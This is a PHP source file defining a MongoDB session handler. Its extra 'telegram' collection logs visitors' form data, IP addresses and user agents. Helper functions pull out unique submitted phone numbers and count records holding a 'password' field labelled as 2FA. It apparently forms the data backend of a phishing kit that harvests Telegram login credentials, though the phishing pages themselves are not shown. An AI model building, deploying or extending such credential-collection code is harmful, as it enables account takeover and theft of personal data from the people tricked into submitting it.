<?php
require_once __DIR__ . '/db_config.php';
require_once __DIR__ . '/../vendor/autoload.php'; // Pastikan MongoDB PHP Library sudah terinstall via Composer

use MongoDB\Client;
use MongoDB\BSON\UTCDateTime;

class MongoDBSessionHandler implements SessionHandlerInterface
{
    private $collection;
    private $telegram_collection;
    private $session_ttl;
    
    public function __construct($connectionString, $dbName = null, $sessionsCollection = null, $telegramCollection = null, $ttl = null) {
        global $mongo_db, $mongo_sessions_collection, $mongo_telegram_collection, $mongo_session_ttl;
        
        // Gunakan parameter atau nilai default dari db_config.php
        $dbName = $dbName ?: $mongo_db;
        $sessionsCollection = $sessionsCollection ?: $mongo_sessions_collection;
        $telegramCollection = $telegramCollection ?: $mongo_telegram_collection;
        $this->session_ttl = $ttl !== null ? $ttl : $mongo_session_ttl;
        
        $client = new Client($connectionString);
        $this->collection = $client->selectDatabase($dbName)->selectCollection($sessionsCollection);
        $this->telegram_collection = $client->selectDatabase($dbName)->selectCollection($telegramCollection);
        
        // Buat indeks TTL hanya jika TTL > 0
        if ($this->session_ttl > 0) {
            $this->collection->createIndex(
                ['lastAccess' => 1],
                ['expireAfterSeconds' => $this->session_ttl]
            );
        }
    }

    public function open($savePath, $sessionName) {
        return true;
    }

    public function close() {
        return true;
    }

    public function read($id) {
        $session = $this->collection->findOne(['_id' => $id]);
        if ($session && isset($session['data'])) {
            return $session['data'];
        }
        return '';
    }

    public function write($id, $data) {
        $document = [
            'data' => $data, 
            'lastAccess' => new UTCDateTime(time() * 1000),
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
        ];
        
        $this->collection->updateOne(
            ['_id' => $id],
            ['$set' => $document],
            ['upsert' => true]
        );
        
        return true;
    }

    public function destroy($id) {
        $this->collection->deleteOne(['_id' => $id]);
        return true;
    }

    public function gc($maxlifetime) {
        // MongoDB TTL indeks menangani ini secara otomatis jika TTL > 0
        // Jika TTL = 0, maka tidak perlu melakukan garbage collection
        return true;
    }
    
    /**
     * Fungsi tambahan untuk menyimpan data ke koleksi telegram
     * 
     * @param string $message Pesan yang akan disimpan
     * @param array $additionalData Data tambahan yang akan disimpan
     * @return bool
     */
    public function saveTelegramData($message, $additionalData = []) {
        $document = [
            'message' => $message,
            'timestamp' => new UTCDateTime(time() * 1000),
            'ip_address' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'session_id' => session_id()
        ];
        
        // Tambahkan data tambahan jika ada
        if (!empty($additionalData)) {
            foreach ($additionalData as $key => $value) {
                $document[$key] = $value;
            }
        }
        
        $result = $this->telegram_collection->insertOne($document);
        
        return $result->getInsertedCount() > 0;
    }
    
    /**
     * Fungsi untuk mendapatkan semua data telegram berdasarkan session ID
     * 
     * @param string $sessionId Session ID
     * @return array
     */
    public function getTelegramDataBySessionId($sessionId) {
        return $this->telegram_collection->find(['session_id' => $sessionId])->toArray();
    }
    
    /**
     * Fungsi untuk mendapatkan semua data session
     * 
     * @return array
     */
    public function getAllSessions() {
        return $this->collection->find([])->toArray();
    }
    
    /**
     * Fungsi untuk mendapatkan semua nomor telepon yang unik
     * 
     * @return array
     */
    public function getUniquePhoneNumbers() {
        $pipeline = [
            ['$group' => [
                '_id' => '$form_data.phoneNumber',
                'count' => ['$sum' => 1]
            ]],
            ['$match' => [
                '_id' => ['$ne' => null]
            ]],
            ['$sort' => ['_id' => 1]]
        ];
        
        $result = $this->telegram_collection->aggregate($pipeline)->toArray();
        
        $phoneNumbers = [];
        foreach ($result as $item) {
            if (isset($item['_id'])) {
                $phoneNumbers[] = $item['_id'];
            }
        }
        
        return $phoneNumbers;
    }
    
    /**
     * Fungsi untuk mendapatkan statistik
     * 
     * @return array
     */
    public function getStatistics() {
        $totalSessions = $this->collection->countDocuments([]);
        $totalTelegramData = $this->telegram_collection->countDocuments([]);
        
        $uniquePhones = count($this->getUniquePhoneNumbers());
        $with2FA = $this->telegram_collection->countDocuments(['password' => ['$exists' => true]]);
        
        return [
            'total_sessions' => $totalSessions,
            'total_telegram_data' => $totalTelegramData,
            'unique_phones' => $uniquePhones,
            'with_2fa' => $with2FA
        ];
    }
}
